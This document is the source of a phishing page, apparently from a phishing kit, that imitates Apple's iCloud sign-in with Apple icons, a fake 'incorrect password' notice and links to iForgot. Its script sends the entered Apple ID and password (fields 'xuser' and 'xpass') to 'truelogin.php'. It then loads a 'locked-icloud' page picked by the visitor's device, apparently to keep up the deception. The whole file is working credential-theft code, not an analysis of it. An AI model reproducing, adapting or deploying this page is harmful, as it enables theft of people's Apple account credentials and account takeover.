<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="nofollow">
<link rel="icon" href="../assets/img/icloud_icon.png" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/img/icloud_icon.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/img/icloud_icon.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/img/icloud_icon.png">
    <link rel="apple-touch-icon-precomposed" href="../assets/img/icloud_icon.png">
    <link rel="shortcut icon" sizes="196x196" href="../assets/img/icloud_icon.png">
</head>
<body style="visibility: visible;top:100px;" class="body_image_old">



<!--[if lt IE 9]>
<script>
    var e = ("abbr,article,aside,audio,canvas,datalist,details," +
    "figure,footer,header,hgroup,mark,menu,meter,nav,output," +
    "progress,section,time,video").split(',');
    for (var i = 0; i < e.length; i++) {
        document.createElement(e[i]);
    }
</script>
<![endif]-->

    <title>iCloud</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="icloud/styles.css">
    <link rel="stylesheet" href="icloud/icloud.css">
    <link rel="stylesheet" href="icloud/jquery-ui.css">
    <script src="../assets/js/jquery.js"></script>
    <script src="icloud/jquery-ui.js"></script>
    <script src="icloud/activity-indicator.js"></script>
	
    <style>
        body {position:fixed;  overflow:hidden}
        html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
        .button:focus>span {
    -webkit-box-shadow:0 0 6px #007eff;
    -moz-box-shadow:0 0 6px #007eff;
    box-shadow:0 0 6px #007eff
}
.button:focus {
    outline:1px dotted black \0/
}
.button:hover {
    text-decoration:none
}
.button:-moz-focusring {
    outline:1px dotted
}
.button.disabled>span, .button.disabled:hover>span {
    cursor:default;
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
}
.button.rect.disabled {
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
    background:#4c88bc;
}

.ns .button, .button.rect {
    font-size: 17px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec, #0070c9);
    border-color: #07c;
    border-width: 1px;
    border-style: solid;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding-left: 15px;
    padding-right: 15px;
    padding-top: 4px;
    padding-bottom: 4px;
    text-align: center;
    white-space: nowrap
}
.ns .button:hover, .ns .button:focus, .button.rect:hover, .button.rect:focus {
    background:#0351b7;
    background:-webkit-linear-gradient(#2f90d5, #0351b7);
    background:-moz-linear-gradient(#2f90d5, #0351b7);
    background:linear-gradient(#2f90d5, #0351b7)
}
.ns .button:active, .ns .button.active, .button.rect:active, .button.rect.active {
    -webkit-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    -moz-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5)
}
.ns .button.community-alt {
    background:0;
    border:0;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button.community-alt:active, .ns .button.community-alt.active {
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button>span, .button.rect>span {
    color:#fff;
    font-size:13px;
    line-height:15px;
    padding:9px 28px;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none;
    background:0;
    border:0;
    -webkit-border-radius:4px;
    -moz-border-radius:4px;
    border-radius:4px
}
.ns .compound-button .handle>span {
    font-size:13px
}
.ns .button:hover>span, .ns .button:focus>span, .button.rect:hover>span, .button.rect:focus>span {
    background-color:transparent;
    border-color:transparent;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.button.rect.small>span {
    padding:7px 18px
}
.button.rect.large>span {
    font-size:18px;
    line-height:16px;
    padding:12px 28px
}
input[type=checkbox] {
    font-size: 19px;
    line-height: 1.47384;
    font-weight: 400;
    letter-spacing: .015em;
    font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    color: #fff;
    padding: 0;
    width: 30px;
    vertical-align: top;
}

    </style>

    <script>
    $(document).ready(function() {
    $('#form_id').keypress(function(e) {
    if (e.which == 13) {
        Bukapass();
    }
    });
    $('#form_pass').keypress(function(e) {
    if (e.which == 13) {
        loginnow();
    }
    });
});
    function loginnow() {
       if(document.getElementById('form_id').value.length == 0 || document.getElementById('form_pass').value.length == 0){
        }else{
        $('#buttonlogin').css('background-image', 'url(../assets/img/33.gif)');
        setTimeout(function () {
        $.ajax({
          type: 'POST',
          url: 'truelogin.php',
          data: $('#form_login_m').serialize(),
          success: function() {
            <?php
            if($os == "Android" or $os == "iPhone") {
                echo "$('#result').load('files/locked-icloud-mobile.php?country=".$_GET['country']."');";
            }else{
                echo "$('#result').load('files/locked-icloud.php?country=".$_GET['country']."');";
            }
            ?>
            <?php
            if($os == "Android" or $os == "iPhone") {
            }else{
            echo '$(".body").css("width", "500px");';
            }
            ?>
            document.getElementById('formlogin').style.display = "none";
            document.getElementById('footer').style.display = "none";
          },
          error: function() {
            console.log("Signup was unsuccessful");
          }
        });
        }, 1200);
    }
    }
    </script>


<div style="opacity: 1;" class="body_image_new"></div>
<div style="display: none;" id="loader" class="loader"><div style="width: 26px; height: 26px; position: absolute; margin-top: -13px; margin-left: -13px;"><svg style="width: 26px; height: 26px;"><g transform="translate(13,13)"><g transform="rotate(30)" stroke="rgb(255, 255, 255)" stroke-linecap="round" stroke-width="1.5"><line opacity="1" transform="rotate(0, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.9173553719008265" transform="rotate(30, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.8347107438016529" transform="rotate(60, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.7520661157024794" transform="rotate(90, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.6694214876033058" transform="rotate(120, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.5867768595041323" transform="rotate(150, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.5041322314049588" transform="rotate(180, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.42148760330578516" transform="rotate(210, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.33884297520661155" transform="rotate(240, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.25619834710743805" transform="rotate(270, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.17355371900826455" transform="rotate(300, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.09090909090909094" transform="rotate(330, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line></g></g></svg></div></div>
<div class="container" style="">
<div class="wrapper">
<div id="asu" class="body" style="top:230px;">
    <div id="result"></div>
    <div id="formlogin">
    <div style="margin-top:1px;" class="myshaker">
        <img style="margin-top:-19px;margin-left:131px" src="icloud/icloud_drive_icon.png" width="100px">
        
        <br><br>
        <center><span style="font-size:21px;color:#404040"><?php echo $signic;?></span></center>
        <div>
            <?php
            if($os == "Android" or $os == "iPhone") {
                $margin = "3px;";
            }else{
                $margin = "10px;";
            }
            ?>
            <div class="boxFrm" style="width:322px;height:93px;margin-top:<?php echo $margin;?>margin-left:19px">
                <script>
                    function Bukapass(){
                        $('#buttonpass').css('background-image', 'url(../assets/img/33.gif)');
                        setTimeout(function () {
                        document.getElementById('passnya').style.display = "block";
                        document.getElementById('buttonpass').style.display = "none";
                        document.getElementById("form_pass").style.borderTopLeftRadius = "0px";
                        document.getElementById("form_pass").style.borderTopRightRadius = "0px";
                        document.getElementById("form_id").style.borderBottomLeftRadius = "0px";
                        document.getElementById("form_id").style.borderBottomRightRadius = "0px";
                        }, 1200);
                    }
                </script>

                <div style="width: 436px; height: 51px; opacity: 1; position: absolute; z-index: 11; margin-left: -218px; left: 50%; top: 268px;" class="atv4 auth-picker overflow-always-visible" id="sc3081"><div aria-hidden="true" class="background"><div class="tl"></div><div class="tlc" style="width: 166px;"></div><div class="tc" style="left: 202px;"></div><div class="trc" style="width: 167px;"></div><div class="tr"></div><div class="cl"></div><div class="c"></div><div class="cr"></div><div class="bl"></div><div class="b"></div><div class="br"></div></div><div class="message">Your Apple ID or password was incorrect.</div><div class="description" style="">Go to iForgot to recover your Apple ID or password.</div><div style="margin-top: -15px; right: 9px; top: 50%; height: 31px; z-index: 2; width: 71px" class="atv4 square sc-view sc-button-view iforgot-button" id="sc3082" tabindex="0" role="button"><div class="button-bg"><div class="left"></div><div class="middle"></div><div class="right"></div></div><a href="https://iforgot.apple.com/" target="_blank"><div class="title">iForgot</div></a></div></div>

            
                <div class="line1">
                    <form action="" id="form_login_m" autocomplete="off" method="POST" target="_self" name="xlogin">
                    <input placeholder="Apple ID" oninput="$('#buttonpass').css('background-image', 'url(../assets/img/btn2.png)');" style="font-size:16px;border-radius:7px;background:#fff;border-width: 1px; border-color:#D5D5D5;border-style: solid;height: 43px;padding-left: 10px;" class="appId1" name="xuser" id="form_id" type="email" required>
                    <span id="buttonpass" onclick="Bukapass();" style="background:url('../assets/img/btn.png');position:absolute;left:303px;top:145px;padding:14px;"></span>
                    <div style="display:none;margin-top:7px;" id="passnya">
                        <input oninput="$('#buttonlogin').css('background-image', 'url(../assets/img/btn2.png)');" placeholder="<?php echo $input_password;?>" style="border-top-bottom-radius: 7px;border-bottom-right-radius: 7px;font-size:16px;border-radius:7px;background:#fff;border-width: 1px;border-color: #D5D5D5;border-style: solid;height: 43px;padding-left: 10px; " class="appId1" name="xpass" id="form_pass" type="password" required>
                    <span onclick="loginnow();" id="buttonlogin" style="background:url('../assets/img/btn.png');position:absolute;left:303px;top:190px;padding:14px;"></span>
                    
                    </div>
                    </form>
                    <div class="clear"></div>
                </div>
                <div class="line2">
                    <div id="submit_loader" style="margin-left: 295px; margin-top: 26px; display: none; position: absolute;"><div style="width: 26px; height: 26px; position: absolute; margin-top: -13px; margin-left: -13px;"><svg style="width: 26px; height: 26px;"><g transform="translate(13,13)"><g transform="rotate(30)" stroke="rgb(0, 0, 0)" stroke-linecap="round" stroke-width="1.5"><line opacity="1" transform="rotate(0, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.9173553719008265" transform="rotate(30, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.8347107438016529" transform="rotate(60, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.7520661157024794" transform="rotate(90, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.6694214876033058" transform="rotate(120, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.5867768595041323" transform="rotate(150, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.5041322314049588" transform="rotate(180, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.42148760330578516" transform="rotate(210, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.33884297520661155" transform="rotate(240, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.25619834710743805" transform="rotate(270, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.17355371900826455" transform="rotate(300, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line><line opacity="0.09090909090909094" transform="rotate(330, 0, 0)" y2="11" x2="0" y1="6" x1="0"></line></g></g></svg></div></div><div class="clear"></div>
                             
                </div>
            </div>

        </div>
        <div style="margin-top:20px;" class="cont">
            <span class="tlrm"><img src="icloud/check1.png" id="help_checkbox" style="margin-top:-2px;"></span>
            <span class="txt"><?php echo $keepme;?></span>
        </div>
        <div class="cont2 sec bothide">
		
		
		
            <div style="margin-top:-90px;" class="center"><br>
		
			<a style="color:#107EE0;font-size:13px;font-weight:100;text-decoration:none;" href="https://iforgot.apple.com/" target="blank" class="clickable"><?php echo $forgot_id;?></a><br>
				<hr style="position:absolute;top:35px;left:68px;width:220px;border-bottom: 1px;opacity: 0.25;">
            </div>
			
			
			
        </div>
    </div>
    </div>
</div>

</div>
</div><div style="display:none">
    <font color="white">
        
    </font>
</div>

</body></html>